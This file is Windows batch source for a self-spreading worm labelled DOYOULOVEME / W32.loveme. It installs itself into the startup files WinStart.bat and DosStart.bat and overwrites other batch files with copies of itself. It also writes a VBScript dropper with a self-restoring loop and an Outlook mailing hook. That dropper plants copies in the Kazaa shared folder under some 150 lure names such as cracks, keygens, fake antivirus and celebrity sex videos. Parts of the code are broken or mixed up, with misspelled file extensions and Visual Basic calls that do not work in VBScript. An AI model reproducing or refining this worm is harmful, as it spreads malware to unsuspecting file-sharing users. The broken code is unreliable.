   @Echo Off
   :: DOYOULOVEME.A.bat
   Echo y| Copy %0 W32.loveme.bat >nul
   move W32.loveme.bat %WinBootDir%\W32.loveme.bat >nul
   c:
   cd %WinBootDir%
   Echo %WinBootDir%\W32.loveme.bat >tmp.bat
   Echo %WinBootDir%\download91166669.vbs >>tmp.bat
   Copy tmp.bat + %WinBootDir%\Winstart.bat %WinBootDir%\system\tmp.bat >nul
   Del %WinBootDir%\WinStart.bat >nul
   move %WinBootDir%\system\tmp.bat %WinBootDir%\WinStart.bat >nul
   Del %WinBootDir%\system\tmp.bat >nul
   Copy tmp.bat + %WinBootDir%\DosStart.bat %WinBootDir%\system\tmp.bat >nul
   Del %WinBootDir%\DosStart.bat >nul
   move %WinBootDir%\system\tmp.bat %WinBootDir%\DosStart.bat >nul
   Echo REGEDIT4>KaZaA.reg
   Echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent] >>KaZaA.reg
   Echo "DisableSharing"=dword:00000000 >>KaZaA.reg
   Echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder" >>KaZaA.reg
   Mkdir C:\TMP >nul
   Echo y| Copy C:\Progra~1\Kazaal~1\Myshar~1\*.* C:\TMP >nul
   Echo y| Copy C:\PROGRA~1\KaZaA\MYSHAR~1\*.* C:\TMP >nul
   Rename C:\TMP\*.* *.bat >nul
   Echo y| Copy %WinBootDir%\W32.loveme.bat C:\ >nul
   cd C:\TMP

   Echo. On Error Resume Next >download91166669.vbs
   Echo Set FSO = CreateObject("Scripting.FileSystemObject") >>download91166669.vbs
   Echo Set WshShell = CreateObject("WScript.Shell") >>download91166669.vbs
   Echo For Each V in FSO.GetFolder("C:\TMP\").Files >>download91166669.vbs
   Echo If FSO.GetExtensionName(V.Name) = "bat" then >>download91166669.vbs
   Echo FSO.CopyFile ("C:\W32.loveme.bat"), V.Name, 1 >>download91166669.vbs
   Echo End If >>download91166669.vbs
   Echo Next >>download91166669.vbs
   Echo if ws.regread ("HKCU\software\loveme\mailed") <> "1" then >>download91166669.vbs
   Echo Outlook() >>download91166669.vbs
   Echo end if >>download91166669.vbs
   Echo >>download91166669.vbs
   Echo Set download91166669 = fso.opentextfile(wscript.scriptfullname, 1) >>download91166669.vbs
   Echo SourceCode = download91166669.readall >>download91166669.vbs
   Echo download91166669.Close >>download91166669.vbs
   Echo Do >>download91166669.vbs
   Echo If Not (fso.fileexists(wscript.scriptfullname)) Then >>download91166669.vbs
   Echo Set download91166669 = fso.createtextfile(wscript.scriptfullname, True) >>download91166669.vbs
   Echo download91166669.write SourceCode >>download91166669.vbs
   Echo download91166669.Close >>download91166669.vbs
   Echo End If >>download91166669.vbs
   Echo Loop >>download91166669.vbs

   echo FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\win32kim.EXE"Set so = CreateObject(fso) >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Norton Antivirus 2004 Professional Edition.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Norton AntiVirus 2004 Full + Serial.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Norton Personal Firewall 2004 Full + Serial.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Norton Personal Firewall 2004 Full Cracked.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Start Menu\Programs\Startup\win32.loveme.vbs" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\WINDOWLOVE.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\ACDSee 5.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Adobe_Keyge.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Age of Empires 2 crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Aim bot ut3.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\All Microsoft Products CD Key Generator.exe  >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\All Norton Antivirus KEys!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Ana Kournikova Sex Video (downloader).exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Animated Screen 7.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Any Nick Name Msn 6.0.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\AOL Instant Messenger Crasher.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\aol password cracker.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Aol_cracker.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\AquaNox2 Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Audiograbber 2.05.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\AVP Antivirus Pro Key Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\BabeFest 2003 ScreenSaver 1.6.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Battlefield1942_bloodpatch.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Battlefield1942_keygen.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Britney Spears Sex Video.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Buffy Vampire Slayer Movie.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\BurnDvds.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Business Card Designer Plus 7.9.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\cable modem ultility pack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\cable modem.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Clone CD 5.0.0.3 (crack).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Clone CD 5.0.0.3.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Cool Edit Pro v2.55.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Counter Strike - See Through Walls.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\counter-strike.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Crack Passwords Mail.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Credit Card Numbers generator(incl Visa,MasterCard).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Credit_Card_Numbers_generator.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Darkness_Krew.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\DeadAim 4.0 KeyGen.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Diablo 3 Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Diablo_2_Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\DirectDVD 5.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\DirectX Buster (all versions).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\DivX Video Bundle 6.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Divx_pro (FINAL!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Divx_Pro_5.1_Serial.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Doom III (Cd KEys).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Download Accelerator Plus 6.1.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\DVD Copy Plus v5.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\DVD Region-Free 2.3.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Dvd_Plus_Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Dvd_Ripper(The Best 04).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Dvd_To_Vcd.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Easy_Dvd_creator_Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Easy_Dvd_Ripper.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Edonkey2000-Speed me up scotty.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Fifa 2004 (Cd Crack).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\FIFA2003 crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Final Fantasy VII XP Patch 1.5.exe" >>download91166669.vbss
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Flash MX crack (trial).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\FlashGet 1.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\FreeRAM XP Pro 1.9.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Game Cube Real Emulator.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\GetRight 5.0a.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Gothic2 licence.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\GTA 3 Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\GTA 3 Serial.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Guitar Chords Library 5.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hack Any Kazaa User.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hack The School.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hack Website Easy.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hacker_The_LoveStory.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Half Life 2 (Cd Crack).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Half Life 2 (cd Keys).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Harry potter2 Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hitman_2_no_cd_crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hotmail Hacker Gold (All Msn Versions!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Hotmail_Hacker_2003-Xss_Exploit.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Ip Nuker V6 (Reall Works).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\KaZaA Hack 2.5.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Kazaa Lite )FINALL!(.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Kazaa SDK + Xbit speedUp for 2.xx.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\KaZaA Speedup 3.6.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\KaZaA-Hack_2.5.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Links 2003 Golf game (crack).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Living Waterfalls 1.3.exe" >>download91166669.vbss
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Love.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\LYNDEN.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Macromedia product keys.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Macromedia_Keygen.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Mafia_crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Mail Bomber For msn messsenger 6.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Matrix Screensaver 1.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Mcafee Antivirus Scan Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\MediaPlayer Update.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Messenger Plus Latest!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Microsoft .NET hack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Microsoft KeyGenerator-Allmost all microsoft stuff.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\mIRC 6.40.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn 6.0 (Multi Messenger).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn 6.0 Crasher!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn 6.0 Kicker.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn 6.0 Password Cracker.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn Emotions (Version 6.0).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn Emotions (Version 6.1).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn Ip Finder 2004.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn Messenger 6.0 Bomber!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Msn Messenger Betta 6.2.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\MSN Password Hacker 5.7 (worked on my ex-girlfriend!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Music Download 2003 (Full Albums).exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\MWorld Of Warcraft (FULL) Installer and Downloader.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\NBA2003_crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Need 4 Speed crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Nero_Burning_Rom_Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Netbios Nuker 2003.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Netbios Nuker 2004.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Netfast 1.8.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Network Cable e ADSL Speed 2.0.5.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Nimo CodecPack (new) 8.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Nimo_Codec_PackUpdater.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Norton Anvirus Key Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\PalTalk 5.01b.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\pamela_anderson.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Panda Antivirus Titanium Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\play station emulator.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Pop-Up Stopper 3.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Popup Defender 6.5.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\PS2 PlayStation Simulator.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Ps2 Real Emulator.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Quake3 - See through wallz.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Quake 3 Keygen (works Great).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Quick Time Key Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\QuickTime_Pro_Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Real Sex Toys!.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Screen saver christina aguilera naked.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Security-2003-Update.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Serials 2003 v.8.0 Full.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Serials 2004 v.8.0 Full.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\serials2000.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\SmartFTP 2.0.0.exe " >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\SmartRipper v2.7.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Space Invaders 1978.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Splinter_Cell_Crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Starcraft serials.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Stripping MP3 dancer+crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Sub 7 2.9.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Trillian 0.85 (free).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\TweakAll 3.8.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Unreal Tournament 2003 (Cd Crack).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Unreal Tournament 2003 (Cd KEys).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Unreal2_bloodpatch.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Unreal2_crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\UT2003_bloodpatch.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\UT2003_keygen.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\UT2003_no cd (crack).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\UT2003_patch.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\VB6.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Visual Basic (ALL KEYS GEN).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Visual Basic 6.0 Msdn Plugin.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Visual Basic Decompiler.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\warcraft 3 crack (Really Works).exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\warcraft 3 serials.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WarCraft_3_crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\winamp plugin pack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WindowBlinds_4.0.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Windows XP complete + serial.exe " >>download91166669.vbss
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\Windows Xp Exploit.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WinOnCD 4 PE_crack.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WinRar 3.xx Password Cracker.exe" >>download91166669.vbs
   echo FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Program Files\Kazaa\My Shared Folder\WinZip 9.0b (CRACK).exe" >>download91166669.vbs
